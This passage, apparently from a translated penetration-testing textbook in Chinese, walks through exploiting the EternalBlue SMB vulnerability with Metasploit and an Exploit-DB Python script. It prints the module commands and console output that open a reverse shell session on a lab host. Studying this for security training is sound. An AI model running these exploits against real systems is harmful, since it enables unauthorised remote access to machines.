
-   我们可以根据目标需求选择不同的模块。在此情境下，我想在远程系统上获取一个 shell；辅助模块会让我们在远程系统上执行单条命令，这与以 `psexec` 结尾的命令相同。因此，我们将使用以 `010_eternalblue` 结尾的 exploit，如下面的代码列表所示。这将在远程主机上提供一个 shell。从该 shell 中，我们可以发出命令，而不止于单个命令，其他模块只能做到的事。

-   一旦我们确定使用的模块，就需要在 `msfconsole` 中使用 `use` 命令加载它。每个模块都有若干选项，这些选项可以或需要设置。在某些情况下，选项已经有默认值，无需额外操作。唯一始终需要设置的参数是目标的那个，它会是 `RHOST` 或 `RHOSTS`，取决于是否期望多个目标。例如，扫描模块会使用 `RHOSTS`，而 exploit 模块通常使用 `RHOST` 作为参数名。下面的代码列表中，我们需要设置 `RHOST` 为要尝试 exploit 的目标 IP 地址。如预期，exploit 成功，给我们提供了远程系统的访问权限。

**Eternal Blue Exploit**

```
Msf6> use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue)> set RHOST 192.168.86.24
RHOST => 192.168.86.24
msf exploit(windows/smb/ms17_010_eternalblue)> exploit
  
[* ] Started reverse TCP handler on 192.168.86.57:4444
[* ] 192.168.86.24:445 - Connecting to target for exploitation.
[+ ] 192.168.86.24:445 - Connection established for exploitation.
[+ ] 192.168.86.24:445 - Target OS selected valid for OS indicated by SMB reply
[* ] 192.168.86.24:445 - CORE raw buffer dump (51 bytes)
[* ] 192.168.86.24:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2
[* ] 192.168.86.24:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard
[* ] 192.168.86.24:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac
[* ] 192.168.86.24:445 - 0x00000030 6b 20 31 k 1
[+ ] 192.168.86.24:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[* ] 192.168.86.24:445 - Trying exploit with 12 Groom Allocations.
[* ] 192.168.86.24:445 - Sending all but last fragment of exploit packet
[* ] 192.168.86.24:445 - Starting non-paged pool grooming
[+ ] 192.168.86.24:445 - Sending SMBv2 buffers
[+ ] 192.168.86.24:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[* ] 192.168.86.24:445 - Sending final SMBv2 buffers.
[* ] 192.168.86.24:445 - Sending last fragment of exploit packet!
[* ] 192.168.86.24:445 - Receiving response from exploit packet
[+ ] 192.168.86.24:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[* ] 192.168.86.24:445 - Sending egg to corrupted connection.
[* ] 192.168.86.24:445 - Triggering free of corrupted buffer.
[* ] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.24:50371) at 2023-01-09 19:52:40 -0600
[+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
[+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-==-=
[+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
```

-   并不是每个漏洞都像上面这个那么成功。当你搜索模块时，会得到一个排名，指示该 exploit 成功的可能性。漏洞并非总是直接可用。在某些情况下，可能存在前置依赖，需要在利用漏洞之前先满足这些条件。你可能需要多次尝试 exploit 才能成功。如果一切都很容易直接完成，那就意味着每个人都能做到，这可能导致更多的安全测试，从而进一步减少软件中的缺陷。

-   **Exploit‑DB**  
    你可以在 `www.exploit-db.com` 搜索与漏洞关联的 exploit。例如，我们正在使用 Eternal Blue exploit，已知它在 Metasploit 中有一个对应的模块。我们可以在 `www.exploit-db.com` 搜索与 Eternal Blue 漏洞相关的模块。在 [Figure 7.2](#c07.xhtml#c07-fig-0002) 中可以看到该搜索的结果。这里列出了三个属于 Windows 相关类别的结果，它们都是可以下载并运行的概念性 Python 脚本。

![FIGURE 7.2 Exploit‑DB search results](images/c07f002.png)

[**FIGURE 7.2**](#c07.xhtml#R_c07-fig-0002) Exploit‑DB search results

-   如果你的系统已安装 Exploit‑DB 包（即拥有 `searchsploit`），你可以直接运行 `searchsploit` 完成相同的搜索。Exploit‑DB 仓库包含 exploit 代码和 shellcode，因此搜索结果不包含像网站那样的论文，只列出 exploit 代码。你不需要通过浏览器下载或查看代码，因为已经在本地下载好了。下面的代码列表展示了搜索结果。我们得到的是三个 exploit 程序的列表，但没有 shellcode 结果。这并不奇怪，因为 Eternal Blue 没有专门的 shellcode，它只是 SMB 协议实现中的一个漏洞。

**searchsploit 结果 for Eternal Blue**

```
kilroy@quiche:~$ searchsploit "eternal blue"
 --------------------------------------- --------------------------------------
  Exploit Title                        |  Path
                                       | (/usr/share/exploitdb/)
 --------------------------------------- --------------------------------------
 Microsoft Windows Windows 7/2008 R2 (x | exploits/windows_x86-64/remote/42031.py
 Microsoft Windows Windows 7/8.1/2008 R | exploits/windows/remote/42315.py
 Microsoft Windows Windows 8/8.1/2012 R | exploits/windows_x86-64/remote/42030.py
 --------------------------------------- --------------------------------------
 Shellcodes: No Result
```

-   你可以在当前目录运行该 exploit，或将其复制到家目录后再运行，这样在执行时无需再提供 Python 脚本的完整路径。这样也方便后续修改，同时保持原始功能代码不变。下面的代码列表展示了使用 `42031.py` 对我们之前在 Metasploit 中使用的同一目标系统进行攻击的过程。命令行最后的参数是名为 `payload` 的可执行文件，它是由两段独立的可执行代码组合而成。第一段是 Python exploit 作者编写的 shellcode，末尾附带一个用于向监听系统发送连接的桩程序。

**Exploit of Eternal Blue from Python Script**

```
root@quiche:~# python 42031.py 192.168.86.24 payload
 shellcode size: 1262
 numGroomConn: 13
 Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
 SMB1 session setup allocate nonpaged pool success
 SMB1 session setup allocate nonpaged pool success
 good response status: INVALID_PARAMETER
 done
```

-   这只是攻击的一半过程。这里展示的是 exploit 成功触发漏洞并让远程服务执行提供的 shellcode。该 shellcode 是由汇编语言编写的可执行文件，包含 Meterpreter shell 以及一种方式让它回连到你配置的监听系统。因此，你也需要设置好监听。

**Exploit Handler**

